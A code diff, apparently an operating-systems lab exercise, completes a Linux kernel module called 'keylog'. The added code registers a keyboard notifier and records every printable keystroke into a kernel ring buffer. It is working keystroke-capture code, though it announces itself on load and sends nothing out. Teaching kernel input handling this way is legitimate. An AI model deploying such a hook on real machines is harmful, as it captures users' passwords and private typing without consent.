@@ -90,7 +90,18 @@ static int keylog_cb(struct notifier_block *nb, unsigned long action, void *data
     struct keyboard_notifier_param *param = data;
 
     /* Part 2 TODO: store printable characters at KBD_KEYSYM stage */
-
+        if (action == KBD_KEYSYM && param->down) {
+            unsigned char c = param->value & 0xFF;
+            if (c >= ' ' && c < 127) {
+                unsigned long flags;
+                spin_lock_irqsave(&keylog_lock, flags);
+                keylog_buf[keylog_head] = c;
+                keylog_head = (keylog_head + 1) % BUF_SIZE;
+                if (keylog_len < BUF_SIZE)
+                    keylog_len++;
+                spin_unlock_irqrestore(&keylog_lock, flags);
+            }
+        }
     /* Part 3 TODO: suppress KEY_Q at KBD_KEYCODE stage */
 
     return NOTIFY_OK;
@@ -137,6 +148,7 @@ static int __init keylog_init(void)
     pr_info("keylog: loaded\n");
 
     /* Part 2 TODO: register keyboard notifier */
+    register_keyboard_notifier(&keylog_nb);
 
     return 0;
 }
@@ -147,7 +159,7 @@ static void __exit keylog_exit(void)
     pr_info("keylog: unloaded\n");
 
     /* Part 2 TODO: unregister keyboard notifier */
-
+    unregister_keyboard_notifier(&keylog_nb);
 
     device_destroy(cls, devno);
     class_destroy(cls);
